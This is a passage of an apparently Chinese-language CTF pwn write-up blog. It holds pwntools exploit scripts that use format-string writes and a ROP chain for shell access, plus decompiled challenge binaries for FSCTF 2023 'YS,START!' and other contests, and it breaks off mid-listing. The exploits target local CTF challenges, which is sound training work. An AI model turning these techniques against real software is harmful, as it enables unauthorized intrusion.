class="line">    bp([<span class="number">0x4007c1</span>])</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    stack_tail=(stack-<span class="number">280</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x48</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x48</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload3)</span><br><span class="line">    <span class="comment">#get arbitray write</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)  <span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)<span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10a0</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">2</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">2</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># merge heap and ROP</span></span><br><span class="line">    prbp = <span class="number">0x400690</span> <span class="comment">#pop rbp;ret;</span></span><br><span class="line">    prsp = <span class="number">0x40082d</span> <span class="comment">#pop rsp r13 r14 r15 ;ret</span></span><br><span class="line">    adc = <span class="number">0x4006E8</span>  </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    adc    DWORD PTR [rbp+0x48],edx</span></span><br><span class="line"><span class="string">    mov    ebp,esp</span></span><br><span class="line"><span class="string">    call   0x400660 &lt;deregister_tm_clones&gt;</span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov    eax,0x601017</span></span><br><span class="line"><span class="string">    push   rbp</span></span><br><span class="line"><span class="string">    sub    rax,0x601010</span></span><br><span class="line"><span class="string">    cmp    rax,0xe</span></span><br><span class="line"><span class="string">    mov    rbp,rsp</span></span><br><span class="line"><span class="string">    jbe    0x400690 </span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    ret   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    arsp = <span class="number">0x0400848</span> <span class="comment">#add    rsp,0x8;ret</span></span><br><span class="line">    prbx = <span class="number">0x40082A</span> <span class="comment">#pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line">    call = <span class="number">0x400810</span> <span class="comment">#mov    rdx,r13</span></span><br><span class="line">                    <span class="comment">#mov    rsi,r14</span></span><br><span class="line">                    <span class="comment">#mov    edi,r15d</span></span><br><span class="line">                    <span class="comment">#call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line">    stderr = <span class="number">0x601040</span>  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line">    one= <span class="number">0x7ffff7afe147</span><span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br><span class="line">    rop=<span class="number">0x6010a0</span></span><br><span class="line">    payload6 = p64(arsp)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#                   rbx   rbp      r12     r13    r14 r15</span></span><br><span class="line">    payload6 += flat(prbx,<span class="number">0</span>,stderr-<span class="number">0x48</span>,rop,<span class="number">0xFFD2BC07</span>,<span class="number">0</span>,  <span class="number">0</span>,  call)</span><br><span class="line">    payload6 += flat(adc,<span class="number">0</span>,prbx,<span class="number">0</span>,<span class="number">0</span>,stderr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x400819</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x82d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">    payload5=payload5.ljust(<span class="number">0x40</span>,<span class="string">&#x27;x00&#x27;</span>)+payload6</span><br><span class="line"></span><br><span class="line">    <span class="comment">#bp([0x4007c1])</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="d3ctf-2019-unprintablev"><a href="#d3ctf-2019-unprintablev" class="headerlink" title="d3ctf_2019_unprintablev"></a>d3ctf_2019_unprintablev</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115397.png" alt="image-20240513200949187"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115398.png" alt="image-20240513201206567"></p><p>禁掉了execve</p><p>实力不济（先鸽了</p><h1 id="第六届强网拟态线下赛-fmt"><a href="#第六届强网拟态线下赛-fmt" class="headerlink" title="[第六届强网拟态线下赛]fmt"></a>[第六届强网拟态线下赛]fmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115399.png" alt="image-20240512212119545"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个栈的后四位地址，然后还有一个非栈上的格式化字符串漏洞（一头雾水</p><p>实力不济（先鸽了</p><h1 id="FSCTF-2023-YS-START"><a href="#FSCTF-2023-YS-START" class="headerlink" title="[FSCTF 2023]YS,START!"></a>[FSCTF 2023]YS,START!</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115400.png" alt="image-20240513225857029"></p><p>这题目比较阴间的地方就是不能反汇编，但是有点玄学，就是把ret undefine掉就可以反汇编了，不理解但是大为震撼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [esp-F6h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-F2h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-EEh] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-EAh] [ebp-138h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-E6h] [ebp-134h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-E2h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-DEh] [ebp-12Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-DAh] [ebp-128h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-D6h] [ebp-124h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-D2h] [ebp-120h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp-CEh] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-CAh] [ebp-118h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-C6h] [ebp-114h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp-C2h] [ebp-110h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-BEh] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-BAh] [ebp-108h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-B6h] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-B2h] [ebp-100h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-A6h] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp-A2h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-9Ah] [ebp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-96h] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-92h] [ebp-E0h]</span></span><br><span class="line">  _DWORD v23[<span class="number">35</span>]; <span class="comment">// [esp-8Eh] [ebp-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-2h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> buf; <span class="comment">// [esp+2h] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+6h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+Ah] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Eh] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [esp+12h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">16</span>]; <span class="comment">// [esp+22h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [esp+32h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [esp+42h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  dword_804C044 = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  buf %= <span class="number">0xF4240</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciallo~(∠・ω&lt; )⌒☆, What is your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, format, v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;,PLAY Genshin Impact?(y or n)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v24 + <span class="number">3</span>, <span class="number">1u</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(v24) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, &amp;v26, <span class="number">4u</span>);</span><br><span class="line">    read(fd, s2, <span class="number">0xF</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your account and password&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Account:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">      &amp;v27,</span><br><span class="line">      v18,</span><br><span class="line">      v19,</span><br><span class="line">      v23,</span><br><span class="line">      v20,</span><br><span class="line">      v21,</span><br><span class="line">      v22,</span><br><span class="line">      v23[<span class="number">0</span>],</span><br><span class="line">      v23[<span class="number">1</span>],</span><br><span class="line">      v23[<span class="number">2</span>],</span><br><span class="line">      v23[<span class="number">3</span>],</span><br><span class="line">      v23[<span class="number">4</span>],</span><br><span class="line">      v23[<span class="number">5</span>],</span><br><span class="line">      v23[<span class="number">6</span>],</span><br><span class="line">      v23[<span class="number">7</span>],</span><br><span class="line">      v23[<span class="number">8</span>],</span><br><span class="line">      v23[<span class="number">9</span>],</span><br><span class="line">      v23[<span class="number">10</span>],</span><br><span class="line">      v23[<span class="number">11</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%15s&quot;</span>,</span><br><span class="line">      s1,</span><br><span class="line">      v23[<span class="number">14</span>],</span><br><span class="line">      v23[<span class="number">15</span>],</span><br><span class="line">      v23[<span class="number">16</span>],</span><br><span class="line">      v23[<span class="number">17</span>],</span><br><span class="line">      v23[<span class="number">18</span>],</span><br><span class="line">      v23[<span class="number">19</span>],</span><br><span class="line">      v23[<span class="number">20</span>],</span><br><span class="line">      v23[<span class="number">21</span>],</span><br><span class="line">      v23[<span class="number">22</span>],</span><br><span class="line">      v23[<span class="number">23</span>],</span><br><span class="line">      v23[<span class="number">24</span>],</span><br><span class="line">      v23[<span class="number">25</span>],</span><br><span class="line">      v23[<span class="number">26</span>],</span><br><span class="line">      v23[<span class="number">27</span>],</span><br><span class="line">      v23[<span class="number">28</span>],</span><br><span class="line">      v23[<span class="number">29</span>],</span><br><span class="line">      v23[<span class="number">30</span>],</span><br><span class="line">      v23[<span class="number">31</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v27 == v26 &amp;&amp; !<span class="built_in">strcmp</span>(s1, s2) )        <span class="comment">// v26是随机数</span></span><br><span class="line">      dword_804C044 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_804C044 )                        <span class="comment">// 直接改这个为1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login is risky. The verification code has been sent to 151xxxx1916&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please enter the verification code:&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span> *, _DWORD, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>))__isoc99_scanf)(</span><br><span class="line">        <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">        &amp;v27,</span><br><span class="line">        v23[<span class="number">34</span>],</span><br><span class="line">        v24,</span><br><span class="line">        buf,</span><br><span class="line">        v26);</span><br><span class="line">      <span class="keyword">if</span> ( v27 == buf )                         <span class="comment">// buf是随机数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Genshin Impact, start!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);                      <span class="comment">// getshell</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;verification code error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Account or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_80494D0();</span><br><span class="line">  JUMPOUT(<span class="number">0x80494C5</span>);                           <span class="comment">// ret</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向并不难</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28161)</span></span><br><span class="line"><span class="comment"># def debug():</span></span><br><span class="line"><span class="comment">#     gdb.attach(p)</span></span><br><span class="line"><span class="comment">#     pause()</span></span><br><span class="line"></span><br><span class="line">pal=p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%15$hn&#x27;</span>+<span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What is your name?\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">data=p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">5</span>:]</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;LAY Genshin Impact?(y or n)\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter your account and password\n&#x27;</span>,<span class="string">b&#x27;1\na&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter the verification code:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(data,<span class="number">16</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这样就打通了。。&#x2F;&#x2F;</p><h3 id="如何解决ida7-7反编译不了"><a href="#如何解决ida7-7反编译不了" class="headerlink" title="如何解决ida7.7反编译不了"></a>如何解决ida7.7反编译不了</h3><p>之后去问了菜哥，他的8.3ida是反编译得了的，然后提示信息是<code>0x80493A9</code>上栈帧出了问题，而我们undefine掉ret会发现scanf的参数十分的多，这就是问题所在了（以前一直以为是常态），因此到scanf点击y，将参数改成两个就可以成功反编译了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115401.png" alt="image-20240514185748987"></p><p>这样就可以成功了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115402.png" alt="image-20240514185809655"></p><p>可以看到成功的代码就是如此的赏心悦目</p><h1 id="CISCN-2022-初赛-login-normal"><a href="#CISCN-2022-初赛-login-normal" class="headerlink" title="[CISCN 2022 初赛]login_normal"></a>[CISCN 2022 初赛]login_normal</h1><p>本题的漏洞点不难，只是逆向要花点时间</p><h2 id="静态分析-3"><a href="#静态分析-3" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是读点数据，然后传参</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 